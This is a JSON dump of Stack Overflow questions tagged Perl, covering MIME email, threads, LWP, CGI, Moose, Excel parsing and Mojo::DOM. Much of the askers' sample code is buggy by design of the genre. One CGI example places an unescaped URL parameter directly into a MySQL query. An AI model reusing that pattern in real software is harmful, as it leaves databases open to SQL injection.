etc...)</p>\n</blockquote>\n\n<p>I am aware of <a href=\"http://www.remobjects.com/ps.aspx\" rel=\"nofollow\">RemObjects PascalScript</a> and <a href=\"http://mmm-experts.com/products.aspx?productid=3\" rel=\"nofollow\">embedding Python in Delphi</a>, but in this instance, I am interested primarily in Perl support.</p>\n\n<p>Has anyone used PLDelphi with success? Or have you found other ways to execute Perl scripts from Delphi without the full Perl installation available locally?</p>\n\n<p>EDIT:\nTo be more clear, I found 1 potential solution and that is using PLDelphi. However, I'd like to know if anyone has used it (last updated in 2004) before, and how well it worked.</p>\n\n<p>I'm also interested in hearing about any other options for embedding a Perl interpreter with Delphi.</p>\n"}]}
{"total":22324,"page":10,"pagesize":100,"questions":[{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":102,"score":5,"question_id":12849307,"title":"How can I print the elements of an array repeated twice each side-by-side?","body":"<p>Please, I have the following line of code to write the header of a file, but I'd like to print each element of the array @order twice side-by-side. For example: $1 $1 $2 $2 $3 $3... in a way that I would have each pair of columns of my output file with the same name.</p>\n\n<pre><code>print(join(\"\\t\", \"Case_ID\", \"State\", \"Ind\", \"DoB\", @order) . \"\\n\");\n</code></pre>\n\n<p>Can I do something simple or I have to loop over the array to repeat the elements before I print?</p>\n\n<p>Thanks!</p>\n"},{"tags":["perl","attachment","mime","docx"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":93,"score":1,"question_id":12831498,"title":"Encoding DOCX to be Sent via email","body":"<p>I am writing a little Perl app to send emails internally where I work, but I am having troubles with attachments.  Now, I can hear all of you screaming \"use MIME::Lite\", but it aint that easy - management rules tell me I am unable to use anything from the cpan...</p>\n\n<p>Anyhow, I am using MIME::Base64 to encode any attachements I am sending.  I am using Net::SMTP for the email side of things.</p>\n\n<p>encoding is done as such (straight out of the Perldoc page):</p>\n\n<pre><code>my $encoded = \"\";\nuse MIME::Base64 qw(encode_base64);\nopen (FILE, \"7857084216_9816ae9bec_b.jpg\") or die \"$!\\n\";\nwhile (read(FILE, $buf, 60*57)) {\n$encoded .= encode_base64($buf);\n}\n</code></pre>\n\n<p>The relevant Net::SMTP code is as follows:</p>\n\n<pre><code>use Net::SMTP;\n$smtp = Net::SMTP-&gt;new(\"mailserver\",\n                Hello =&gt; 'somedomain.com.au',\n                Timeout =&gt; 60,\n                Debug =&gt; 0,\n                );\n$smtp-&gt;mail(&lt;services\\@somedomain.com.au&gt;);\n$smtp-&gt;to(&lt;me\\@somedomain.com.au&gt;);\n$smtp-&gt;cc(&lt;another\\@somedomain.com.au&gt;);\n$smtp-&gt;data();\n$smtp-&gt;datasend(\"Subject: testing 123\\n\");\n$smtp-&gt;datasend(\"To: me\\@somedomain.com.au\\n\");\n$smtp-&gt;datasend(\"CC: another\\@somedomain.com.au\\n\");\n$smtp-&gt;datasend(\"MIME-Version: 1.0\\n\");\n$smtp-&gt;datasend(\"Content-type: multipart/mixed;\\n\\tboundary=\\\"$boundary\\\"\\n\");\n$smtp-&gt;datasend(\"--$boundary\\n\");\n$smtp-&gt;datasend(\"Content-type: text/html; charset=utf-8\\n\");\n$smtp-&gt;datasend(\"\\n\");\n$smtp-&gt;datasend(\"&lt;p&gt; Test Email!&lt;/p&gt;\\n\");\n$smtp-&gt;datasend(\"\\n\");\n$smtp-&gt;datasend(\"--$boundary\\n\");\n$smtp-&gt;datasend(\"Content-type: image/jpeg; name=\\\"7857084216_9816ae9bec_b.jpg\\\"\\n\");\n$smtp-&gt;datasend(\"Content-ID: \\n\");\n$smtp-&gt;datasend(\"Content-Disposition: attachment; filename=\\\"7857084216_9816ae9bec_b.jpg\\\"\\n\");\n$smtp-&gt;datasend(\"Content-transfer-encoding: base64\\n\");\n$smtp-&gt;datasend(\"\\n\");\n$smtp-&gt;datasend(\"$encoded\");\n$smtp-&gt;datasend(\"\\n\");\n$smtp-&gt;datasend(\"--$boundary--\\n\");\n$smtp-&gt;dataend;\n$smtp-&gt;quit;\n</code></pre>\n\n<p>At this moment, I am directing these emails through to myself and reading them using Outlook 2010\nWhen sending images (such as jpegs), I am not having any issues at all - everything seems to decode OK byte for byte as far as I can see.\nWhen I am sending docx type files with just plain text, everything seems fine.\nBut, when I am sending docx files with images inserted, the files are corrupting.</p>\n\n<p>Not being an expert in mail sending and attaching, I am at a bit of a loss.  How should I be encoding docx files for attaching to emails?  Any help would be appreciated!</p>\n\n<p>Also forgot to mention, I have attempted to set the content-type accordingly: Content-type: application/vnd.openxmlformats-officedocument.wordprocessingml.document</p>\n"},{"tags":["multithreading","perl","hash","share"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":88,"score":0,"question_id":12848312,"title":"How to share hash of hash in multithread perl","body":"<p>One way to share a hash of hash is to declare every level of hashes like:</p>\n\n<pre><code>my %hash : shared;\n$hash{test} = &amp;share({});\n</code></pre>\n\n<p>but what if the first level keys' amount cannot be predicted or too much that you cannot declare every one.</p>\n\n<p>like the code below:</p>\n\n<pre><code>#!/usr/bin/perl -w\nuse strict;\nuse threads;\nuse threads::shared;\n\nmy %counts :shared;\nmy $infile = $ARGV[0];\nopen my $inf, \"$infile\";\n\nwhile(my $inline = &lt;$inf&gt;){\n    chomp($inline);\n    my @entry = split(/\\t/,$inline);\n    my $t = threads-&gt;create('WORK',@entry)-&gt;join;\n}\n\nforeach my $i(sort {$a cmp $b} keys %counts){\n    foreach my $j(sort {$a cmp $b} keys %{$counts{$i}}){\n        print \"$i\\t$j\\t$counts{$i}{$j}\\n\";\n    }\n}\n\nsub WORK{\n    my @work = @_;\n    $counts{$work[0]}{$work[1]}++;\n}\n</code></pre>\n\n<p>And the test set:</p>\n\n<pre><code>apple   pie\nbanana  icecream\norange  juice\nmango   juice\nmango   pie\nmango   pie\n......\n</code></pre>\n\n<p>The script will be stopped by warning you that \"Invalid value for shared scalar at SOME line\". So is there a way I can share both %counts and %{$counts{KEY1}}? Suppose I don't know how many and what kinds of fruit I will observe of test set column one and the output should be like:</p>\n\n<pre><code>apple    pie      1\nbanana   icecream 1\nmango    juice    1\nmango    pie      2\norange   juice    1\n</code></pre>\n"},{"tags":["windows","perl"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":2630,"score":3,"question_id":2652261,"title":"Why does Perl complain about \"Unsuccessful stat on filename containing newline\"?","body":"<p>I am getting an error I do not understand. I am using File:Find to recurse a fylesystem on Windows using Activestate Perl 5.8.8 and trying to stat <code>$File::Find::name</code>; so I am not <code>stat</code>-ing a filename got from a text file scanning requiring <code>chomp</code>-ing or newline removing. I was unable to get file modification time, the <code>mtime</code> in:</p>\n\n<pre><code>my ($dev,$ino,$mode,$nlink,$uid,$gid,$rdev,$size,$atime,$mtime,$ctime,$blksize,$blocks) = stat($File::Find::name);\n</code></pre>\n\n<p>so trying a </p>\n\n<pre><code>-s $File::Find::name \n</code></pre>\n\n<p>gives me the error:</p>\n\n<blockquote>\n  <p>Unsuccessful stat on filename containing newline</p>\n</blockquote>\n\n<p>A typical file name found is <em>F01-01-10 Num 0-00000.pdf</em> but I get the same error even renaming in <em>E02.pdf</em></p>\n"},{"tags":["perl"],"answer_count":4,"favorite_count":0,"up_vote_count":8,"down_vote_count":0,"view_count":11592,"score":8,"question_id":4505381,"title":"Perl read line by line","body":"<p>I have a simple Perl script to read a file line by line. Code is below. I want to display two lines and break the loop. But it doesn't work. Where is the bug?</p>\n\n<pre><code>$file='SnPmaster.txt';\nopen(INFO, $file) or die(\"Could not open  file.\");\n\n$count = 0; \nforeach $line (&lt;INFO&gt;)  {   \n    print $line;    \n    if ($++counter == 2){\n      last;\n    }\n}\nclose(INFO);\n</code></pre>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":12833610,"title":"How do I find what is the value of offset of this byte?","body":"<p>So somehow from the following hex data <code>(03 00 21 04 80 04)</code> the values below were obtained. </p>\n\n<p>Can anybody can tell how how can I do this and how it was achieved?</p>\n\n<pre><code>Band                                 = 3  (40,6)\nDuplex_Mode                          = 0  (46,1)\nResult                               = 0  (47,1)\nReserved_1                           = 0  (48,8)\nMin_Search_Half_Frames               = 1  (56,5)\nMin_Search_Half_Frames_Early_Abort   = 1  (61,5)\nMax_Search_Half_Frames               = 1  (66,5)\nMax_PBCH_Frames                      = 0  (71,5)\nNumber_of_Blocked_Cells              = 0  (76,3)\nNumber_PBCH_Decode_Attemp_Cells      = 1  (79,3)\nNumber_of_Search_Results             = 1  (82,4)\nReserved_2                           = 0  (86,2)\n</code></pre>\n\n<p>The parameters in paranthesis is the Offset/Length I am told. I don't understand how based on that information should I be able to unpack this payload.</p>\n\n<p>So I have written </p>\n\n<pre><code>my $data = pack ('C*', map hex, split /\\s+/, \"03 00 21 04 80 04\");\n($tmp1, $Reserved_1, $tmp2) = unpack(\"C C V\", $data);\n</code></pre>\n\n<p>And now help. How do I unpack the table values above from <code>$tmp1</code> and <code>$tmp2</code> ?</p>\n\n<p>EDIT: Hex Data = <code>\"00 00 00 7F 08 03 00 21 04 80 04 FF D7 FB 0C EC 01 44 00 61 1D 00 00 10 3B 00 00 FF D7 FB 0C 00 00 8C 64 00 00 EC 45\"</code></p>\n\n<p>Thanks!</p>\n"},{"tags":["perl","cgi","xpdf"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":12802076,"title":"XPDF pdftotext and page number handling","body":"<p>Using perl to utilize pdftotext for the purpose of extracting text from a pdf. Works great. My issue is that the pdf's I am reading are multi-page and I am looking for data on specific lines at the top each page. The following code dumps the entire contents of both pages to one file. Because the data length after the constant data (at the top of page) varies I can't accurately pull my data from page 2. How would I step through each page either using pdftotext or some other utility/module first, then call pdftotext on each page individually?</p>\n\n<pre><code>#!/usr/bin/perl\nprint \"Content-type: text/html\\n\\n\";\n\nprint \"\\n&lt;style&gt;\ndiv.line {width:100%;white-space:nowrap;}\ndiv.line div {width:80px;float:left;}\n&lt;/style&gt;\";\n\nmy $i=0;\nopen FILE, \"pdftotext -layout my_multi_page_pdf.pdf - |\";\n\nwhile (&lt;FILE&gt;) {\n\n    $i++;\n    my ($line) = $_;\n    print \"\\n&lt;div class=\\\"line\\\"&gt;&lt;div&gt;$i&lt;/div&gt;$line&lt;/div&gt;\";\n}\nclose FILE;\n</code></pre>\n"},{"tags":["perl","https","ssl-certificate"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":5570,"score":2,"question_id":6795030,"title":"How to ignore 'Certificate Verify Failed' error in perl?","body":"<p>I want to access a website where the certificate cannot be verified. I'm using WWW::Mechanize get request. So how would go about ignoring this and continues to connect to the website?</p>\n"},{"tags":["perl","data-dumper"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12845142,"title":"Perl and Data::Dumper::HTML + cgi","body":"<p>First of all my english is not the best, thank you for understanding.</p>\n\n<p>A portion of the code principal index.cgi</p>\n\n<pre><code>my ($url, $params) = split(/\\?/, $ENV{'REQUEST_URI'}); \nmy @pairs = split(/&amp;/, $params);\n\nforeach $pair (@pairs) {\n\n    my ($name, $value) = split(/=/, $pair);\n    $value =~ tr/+/ /;\n    $value =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack(\"C\", hex($1))/eg;\n    $PARAM{$name} = $value;\n}\nmy $consulta = $PARAM{'buscar'};\n\nprint CGI::header();\nprint qq{&lt;div style=\"font-family: monospace\"&gt;\\n};\n$mysqltest-&gt;buscar($consulta);\nprint \"\\n&lt;br /&gt;&lt;br /&gt;\\n\";\nprint \"\\n&lt;/div&gt;\\n\";\n</code></pre>\n\n<p>Module Search and result is print in cgi -> index.cgi</p>\n\n<pre><code>sub buscar{\n    my $self = shift;\n    my $keyword = shift;\n\n    die \"not work\" if not $self-&gt;{mysqlopen};\n\n    my $queryKeyword = $self-&gt;{connect}-&gt;prepare(\"SELECT * FROM savebookmarks WHERE MATCH (url,descripcion) AGAINST ('$keyword');\");\n    $queryKeyword-&gt;execute();\n\n    while (my $resultKeyword = $queryKeyword-&gt;fetchrow_hashref()) {\n\n        print dumper_html(\"$resultKeyword-&gt;{id} $resultKeyword-&gt;{descripcion} $resultKeyword-&gt;{url}\");\n    }\n    $queryKeyword-&gt;finish();\n    return;\n}\n</code></pre>\n\n<p>Result print output in index.cgi</p>\n\n<pre><code>...\n$VAR1 = 'The Python Standard Library Ã¢â¬â Python v2.7.2 documentation http://docs.python.org/library/';\n$VAR1 = 'python-nmap : using nmap from python http://xael.org/norman/python/python-nmap/';\n$VAR1 = 'Manejo de Excepciones en Python ÃÂ« Tutorial Python http://tutorial-python.com.ar/?p=193';\n$VAR1 = 'FAQ\\'s de Python - Foros del Web http://www.forosdelweb.com/f130/faqs-python-591053/#post2533652';\n...\n</code></pre>\n\n<p>The problem that I have or I can not resolve is, the impression of the query adds '<strong>$ VAR1 =' (it should not be)</strong> affecting the result, some one to fix it?</p>\n\n<hr>\n\n<p>this is perfect output i need. -></p>\n\n<pre><code>...\n'The Python Standard Library Ã¢â¬â Python v2.7.2 documentation http://docs.python.org/library/';\n'python-nmap : using nmap from python http://xael.org/norman/python/python-nmap/';\n'Manejo de Excepciones en Python ÃÂ« Tutorial Python http://tutorial-python.com.ar/?p=193';\n'FAQ\\'s de Python - Foros del Web http://www.forosdelweb.com/f130/faqs-python-591053/#post2533652';\n ...\n</code></pre>\n"},{"tags":["perl","http","get","request","truncate"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":45,"score":-1,"question_id":12845842,"title":"perl http request, how to truncate output","body":"<p>I am trying to user perl to read a text file online, using a call like this:</p>\n\n<pre><code>$output = $ua-&gt;request($req)-&gt;as_string;\n</code></pre>\n\n<p>The problem is that output has a lot of garbage in it that I don't want, e.g.</p>\n\n<pre><code>HTTP/1.1 200 OK\nConnection: close\nDate: \netc...\n</code></pre>\n\n<p>Is there a way to truncate the output so I get only the contents of the file?</p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":70,"score":0,"question_id":12844984,"title":"Add a string to the end of hash values","body":"<p>I'm new in perl and have a question concerning the use of hashes. Althought similar questions were posted before none of them was related to my problem.</p>\n\n<p>I have a fasta file with several sequences of different length and want to add a string (N in this case) to the end of each fasta entry until the length of all sequences are the same. At this point I'm being able to read the fasta file and return each sequence as a string (but can also be done as arrays) to the value of an hash. The key elements are the corresponding headers of the fasta file.</p>\n\n<p>My code is the following:</p>\n\n<pre><code>###### calculate the length of each hash value and store the highest value in $max\nmy $length;\nmy $max = 0;\nmy $addN = \"N\";\n\nforeach $name ( keys %seq ) {\n    $length = length($seq{$name});\n    if ($max &lt; $length) {\n        $max = $length;\n    } else { next }\n    print $max,\"\\n\";\n\n    while (length ($seq{$name}) &lt; $max) {\n        $seq{$name} .= $addN;\n    }\n    foreach $name (keys %seq) {\n        print $seq{$name};\n        print \"\\n\";\n    }\n}\n</code></pre>\n\n<p>The problem here is that the output of this code is exactly the same as the input, e.g.,</p>\n\n<pre><code>INPUT:\n&gt;fasta1\nAAAAAAAAA\n&gt;fasta2\nAA\nOUTPUT\n&gt;fasta1\nAAAAAAAAA\n&gt;fasta2\nAA\n</code></pre>\n\n<p>where I wanted an output like this:</p>\n\n<pre><code>&gt;fasta1\nAAAAAAAAA\n&gt;fasta2\nAANNNNNNN\n</code></pre>\n\n<p>Can you please help me to accomplish this task?</p>\n"},{"tags":["perl","http","version","lwp","peer"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":58,"score":1,"question_id":12842906,"title":"Perl LWP trying to set peer_http_version to HTTP/1.0","body":"<p>Getting a 500 server error trying to connect to a Microsoft-HTTPAPI/2.0 server using perl LWP. Can successfully connect using browser. Only difference I see is browser issues HTTP/1.0 protocol vs LWP HTTP/1.1.  So I tried forcing LWP to use the older protocol without success. I found examples for setting this protocol but packet examination with Wireshark still shows HTTP/1.1. What have I missed here. Using Active Perl v5.16.1.</p>\n\n<pre class=\"lang-perl prettyprint-override\"><code>#! C:\\Perl64\\bin\\perl.exe\nuse strict;\nuse warnings;\nuse LWP::UserAgent;\nuse HTTP::Request;\nuse HTTP::Request::Common;\nmy $ua = new LWP::UserAgent(keep_alive=&gt;1);\n# trying to force HTTP/1.0\npush(@LWP::Protocol::http::EXTRA_SOCK_OPTS, PeerHTTPVersion =&gt; \"1.0\");\nmy $response = $ua-&gt;request(GET \"http://google.com\");\n</code></pre>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":4,"view_count":196,"score":-4,"question_id":2549038,"title":"How can I extract sentences with a particular phrase, in Perl?","body":"<p>How can I write a Perl script that would scrape out sentences that mention 'Calvein Klein' in articles in a file named by <code>$file</code>? (Sentences can cross zero or more CR/LF characters.) I want to create an array of sentences scraped and print it at the end.</p>\n"},{"tags":["perl","moose"],"answer_count":1,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":79,"score":4,"question_id":12838578,"title":"Passing a block to a Moose method","body":"<p>Is it somehow possible to pass blocks to Moose methods? In standard Perl, I can define a function with prototypes like this</p>\n\n<pre><code>sub fn (&amp;) {\n    my $code =\\&amp;{shift @_};\n    $code-&gt;();\n}\n</code></pre>\n\n<p>and then pass a block to the function without explicit <code>sub</code> references, i.e. <code>fn { say \"Hi there, world\" }</code>.</p>\n\n<p>I think this is only possible if the subroutine is the first parameter, and as this is always <code>$self</code> with a Moose method, it doesn't seem possible there, forcing me to do it the slightly more explicit way:</p>\n\n<pre><code>sub wrapper {\n    my ($self, $code) = @_;\n    $code-&gt;()\n}\n\nWrapper-&gt;wrapper(sub { say \"Hi there, world\" });\n</code></pre>\n\n<p>Now this would be a pretty convenient way to wrap some blocks, i.e. to provide some additional text or conditionally execute code or wrap an eval around some code where the error handling stays the same (e.g. eval some code and log errors, record user etc.).</p>\n\n<p>If I'm not missing something, is there some semi-convenient workaround or alternative method to achieve something like this without too much line noise?</p>\n"},{"tags":["perl","graph","charts"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":1110,"score":1,"question_id":728625,"title":"Adding text to graph in Perl's GD::Graph?","body":"<p>I am drawing a graph using <a href=\"http://search.cpan.org/dist/GD-Graph\" rel=\"nofollow\">GD::Graph</a> module in Perl. </p>\n\n<p>I can draw the graph fine but in the drawn image I want to add some text around the top of the drawn graph image.  Basically just want to add some text to this drawn image.  However, I don't see an option to do that.  </p>\n\n<p>Does someone know if this is doable?</p>\n"},{"tags":["html","perl","apache","cgi"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":84,"score":0,"question_id":12841439,"title":"Why my Perl CGI script display not rendered html code(not source), instead of page?","body":"<p>My perl script displays rendered code, when i run it from shtml</p>\n\n<pre><code>&lt;!--#include virtual=\"/cgi-bin/Script.cgi\"--&gt;\n</code></pre>\n\n<p>When i run it directly from adress field(site.com/cgi-bin/Script.cgi), i see html code. Why does it happen?\nThanks.</p>\n"},{"tags":["perl","timestamp","dbm"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":277,"score":0,"question_id":710479,"title":"How can I store a timestamp in a DBM database?","body":"<p>I am implemening simple file-sharing service. Currently I use a file-based database (as it suits my needs).</p>\n\n<pre><code>   # somewhere in my cgi script\n   sub first_run\n    {\n      my $dbh = DBI-&gt;connect('dbi:DBM:');\n      $dbh = DBI-&gt;connect(\"dbi:DBM:\", \"\", \"\",{ AutoCommit =&gt; 1, RaiseError =&gt; 1, f_dir=&gt;$DATABASE_DIR} );\n      unless ($dbh)\n      {\n        print \"&lt;br&gt;Cannot connect: $DBI::errstr\";\n        return undef;\n      }\n      $dbh-&gt;do(\"CREATE TABLE uploads( user_name TEXT,\n        file_name TEXT, \n        upload_date TEXT ) \");\n      $dbh-&gt;disconnect( );\n    }\n</code></pre>\n\n<p>As you can see I propose to store the upload timestamp as a string, since currently I only have to display it (suppose to use localtime() to get timestamp in a human readable format).\nBut this seems to me somewhat bad. What if later I'll want to show uploads from some period, etc.</p>\n\n<p>What is the common way of storing timestamps in a DBM database without using third-party, CPAN modules? How can I pull them later and show them to the user (in my situation, convert back to string)?</p>\n"},{"tags":["regex","perl","arrays","context"],"answer_count":6,"favorite_count":3,"up_vote_count":8,"down_vote_count":0,"view_count":4586,"score":8,"question_id":1849329,"title":"Is there a Perl shortcut to count the number of matches in a string?","body":"<p>Suppose I have:</p>\n\n<pre><code>my $string = \"one.two.three.four\";\n</code></pre>\n\n<p>How should I play with context to get the number of times the pattern found a match (3)?  Can this be done using a one-liner?</p>\n\n<p>I tried this:</p>\n\n<pre><code>my ($number) = scalar($string=~/\\./gi);\n</code></pre>\n\n<p>I thought that by putting parentheses around <code>$number</code>, I'd force array context, and by the use of <code>scalar</code>, I'd get the count. However, all I get is <code>1</code>.</p>\n"},{"tags":["perl","subgraph"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":184,"score":1,"question_id":8729302,"title":"Creating a subgraph of a graph induced by node list","body":"<p>I'm currently using <a href=\"http://search.cpan.org/~jhi/Graph-0.94/lib/Graph.pod\" rel=\"nofollow\">Graph</a>, however it lacks a  method to create a subgraph of the original graph induced by given list of vertices. </p>\n\n<p>I've written a stub which does it using Graph's accessors, but  </p>\n\n<p>Here's my code: </p>\n\n<pre><code># subgraph ($graph, @node_list); \n# return subgraph (with the same setup) \n# induced by node list\nsub subgraph {\n    my $self = shift;\n    my $new = $self-&gt;new;\n    my @edges;\n    foreach my $v(@_) {\n        $self-&gt;has_vertex($v) or next;\n        $new-&gt;add_vertex($v);\n        foreach my $u(@_) {\n            $self-&gt;has_edge($u, $v) and push @edges, $u, $v;\n        };\n    };\n    $new-&gt;add_edges(@edges);\n    return $new;\n};\n</code></pre>\n\n<p>NOTE: </p>\n\n<ul>\n<li><p>The <code>$Graph-&gt;new</code> behaviour is undocumented, however as the Graph's source shows it would copy the attributes, but not vertices/edges. </p></li>\n<li><p>There's already a feature request on CPAN: <a href=\"https://rt.cpan.org/Ticket/Display.html?id=65497\" rel=\"nofollow\">https://rt.cpan.org/Ticket/Display.html?id=65497</a></p></li>\n</ul>\n\n<p>So, is there some other module (probably XS), or should I patch <code>Graph</code>, or everyone writes a graph class themselves and I should do it, too? </p>\n"},{"tags":["perl","bash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":65,"score":0,"question_id":12836289,"title":"Running a program that requires a password on the command line from a Perl script","body":"<p>I have written a Perl wrapper around a shell script. I am using IPC::Run::Simple to execute system commands.  As an example: </p>\n\n<pre><code>run (\"mkdir ~$usr/12.2.0_cp/faiz_cpv/$pdate\") or die \"Error $ERR\";\nrun (\"cp ~$usr/12.2.0_cp/faiz_cpv/MPlist.lst ~$usr/12.2.0_cp/faiz_cpv/$pdate\") || die \"Error: $ERR\";\nrun (\"cd ~$usr/12.2.0_cp/faiz_cpv/$pdate; sh /opsutils/mfg_top/rel/CPV/bin/list_generation.sh . MPlist.lst mfg_relall_us\\@oracle.com\") or die \"error $ERR\";\n.\n.\n</code></pre>\n\n<p>One of these shell scripts requires the user of the script to enter their password. That is, a message is printed on stdout and the password is accepted via the shell. A number of calls are made to this shell script during the entire process which means a user must reenter his password a number of times. </p>\n\n<p>Is there a way by which I can request user for the password at the command line itself, and pass that password implicitly instead of prompting user for the password again and again?</p>\n"},{"tags":["perl","excel"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":76,"score":0,"question_id":12838912,"title":"Get name of excel worksheets in perl","body":"<p>I am a newbie to coding and perl.</p>\n\n<p>I am trying to read names of excel worksheets in an excel file through Perl</p>\n\n<p>Following is my code</p>\n\n<pre><code>#!/usr/local/ActivePerl-5.12/bin//perl -w\n\nuse strict;\nuse Spreadsheet::ParseExcel;\n\nmy $FileName = \"/Users/labuser/Desktop/TestAutomation/Results.xls\";\n\nmy $parser   = Spreadsheet::ParseExcel-&gt;new();\nmy $workbook = $parser-&gt;parse($FileName);\n\ndie $parser-&gt;error(), \".\\n\" if ( !defined $workbook );\n\nfor my $worksheet ( $workbook-&gt;worksheets() ) {\n\nprint $worksheet;\n\n}   \n</code></pre>\n\n<p>But i am not able to get name of the worksheet through print $worksheet.\nPlease suggest how can i get that</p>\n"},{"tags":["perl","windows-7","command-line-arguments","activeperl"],"answer_count":3,"favorite_count":3,"up_vote_count":1,"down_vote_count":0,"view_count":2227,"score":1,"question_id":4234581,"title":"@ARGV is empty using ActivePerl in Windows 7","body":"<p>I have the following Perl script.  I am trying to run it in Windows 7 using ActivePerl:</p>\n\n<pre><code>#!c:\\Perl64\\bin\\perl.exe -w\n\nuse strict;\n\nmy $mp3splt_exe = 'c:\\Program Files (x86)\\mp3splt\\mp3splt.exe';\n\nmy $mp3splt_args = '-o \"@n @f\" -g \"r%[@o @N]\"  -f -t 6.0';\n\nprint @ARGV;\nmy $filename = $ARGV[0];\n\nprint \"$mp3splt_exe $mp3splt_args $filename\\n\";\n</code></pre>\n\n<p>(as you can see, I am trying to create a wrapper for mp3splt :-) )</p>\n\n<p>When I run it like this:</p>\n\n<blockquote>\n  <p>C:\\Program Files (x86)\\mp3splt>run_mp3splt.pl a</p>\n</blockquote>\n\n<p>I get this:</p>\n\n<pre><code>Use of uninitialized value $filename in concatenation (.) or string at C:\\Program Files (x86)\\mp3splt\\run_mp3splt.pl line 12.\nc:\\Program Files (x86)\\mp3splt\\mp3splt.exe -o \"@n @f\" -g \"r%[@o @N]\"  -f -t 6.0\n</code></pre>\n\n<p>So, first of all, when I <code>print @ARGV</code>, nothing gets printed, and second of all, when I assign <code>$filename = $ARGV[0]</code>, <code>$filename</code> is <code>undef</code>, so I get the warning.</p>\n\n<p>So... what am I doing wrong? Why isn't the commandline parameter being passed to the script?</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":78,"score":1,"question_id":12837561,"title":"Perl how to apply a regex only on variable which has two words?","body":"<p>I want to apply a regex on lines where I have only 2 words. My file looks like this with variable numbers of spaces between the words in parentheses:</p>\n\n<p>Politician_name:(Jose Maria Aznar | jose maria aznar | JosÃ© MarÃ­a Aznar | josÃ© marÃ­a aznar );\nPolitician_name:(Tony Blair | tony blair | Tony Blair | tony blair  );</p>\n\n<p>I want to have as an output:</p>\n\n<p>Politician_name:(Tony Blair | tony blair | Tony Blair | tony blair | <strong>blair tony | Blair Tony</strong>);</p>\n\n<p>My code applies the regex on each line and I get false output like this:</p>\n\n<p>Politician_name:(Jose Maria Aznar | jose maria aznar | JosÃ© MarÃ­a Aznar | josÃ© marÃ­a aznar | <strong>maria jose | Maria Jose</strong> );</p>\n\n<p>This is my code :</p>\n\n<pre><code>use strict;\nuse warnings;\nuse Data::Dumper;\nuse utf8;\n\nopen(IN, $ARGV[0]) or die \"Can't read file $ARGV[0]\\n\";\nwhile (my $line=&lt;IN&gt;)\n{\n    my ($pol,$value) = split(/:/, $line);\n\n    warn Dumper \\$pol;\n    chomp($value);\n    $value=~ s/[  ]+/ /g;\n    $value=~ s/\\);//g;\n    my $n;  \n    $n = $1 if ($value =~ /\\((.+?)\\|/); \n    $n=~ m/(\\w*)\\s(\\w*)/g;\n    my $swapname=\"$2 $1\";\n    warn Dumper \\$swapname;\n\n    print \"$pol: $value | $swapname );\\n\";\n\n}\nclose(IN); \n</code></pre>\n\n<p>What do I need to do to stop handling 3-word names?</p>\n"},{"tags":["perl","dom","syntax","html-parsing","mojolicious"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":118,"score":2,"question_id":12819150,"title":"advanced perl syntax - Mojo::DOM","body":"<p>I am trying to understand some advanced (for me) perl constructions (syntax) for html parsing using DOM following this tutorial:</p>\n\n<p><a href=\"http://blogs.perl.org/users/joel_berger/2012/05/using-mojodom.html\" rel=\"nofollow\">using mojo dom tutorial</a></p>\n\n<pre><code>say \"div days:\";\nsay $_-&gt;text for $dom-&gt;find('div.days')-&gt;each;\n\nsay \"\\nspan hours:\";\nsay $_-&gt;text for $dom-&gt;find('span.hours')-&gt;each;\n</code></pre>\n\n<p>What does this syntax mean, what is going on here ? What kind of loop is this, is this some perlish special loop. Classic for construction looks like this: for(i=0;i&lt;10;i++){ code } not: {code} for (some_condition)</p>\n\n<p>Also what does \"each\" keyword mean in this context ? Does it have somethin common with \"each\" build in perl function described on this site: <a href=\"http://perldoc.perl.org/functions/each.html\" rel=\"nofollow\">each refference manual</a> or it is specific to Mojo::DOM ? I think if \"each\" will be under Mojo::Dom it should be mantioned on Mojo::DOM homepage. But I did not found any mention about \"each\" under methods section on this site: <a href=\"http://search.cpan.org/~sri/Mojolicious-3.44/lib/Mojo/DOM.pm\" rel=\"nofollow\">Mojo:Dom refference manual</a>\n so it must be a build in function of perl, BUT this buildin \"each\" function has completelly different syntax, how is this possible, am I missing somethin ?</p>\n\n<p>Another example from tutorial page</p>\n\n<pre><code>say \"Open Times:\";\nsay for $dom-&gt;find('div.openTime')\n            -&gt;map(sub{$_-&gt;children-&gt;each})\n            -&gt;map(sub{$_-&gt;text})\n            -&gt;each;\n</code></pre>\n\n<p>Same issue as above for \"map\" and \"sub\" methods</p>\n\n<p><a href=\"http://perldoc.perl.org/functions/map.html\" rel=\"nofollow\">map refference manual</a></p>\n\n<p><a href=\"http://perldoc.perl.org/functions/sub.html\" rel=\"nofollow\">sub refference manual</a></p>\n\n<ul>\n<li>Can be those pieces of \"Perlish\" code rewriten in more \"C specific\" maner so I can understand 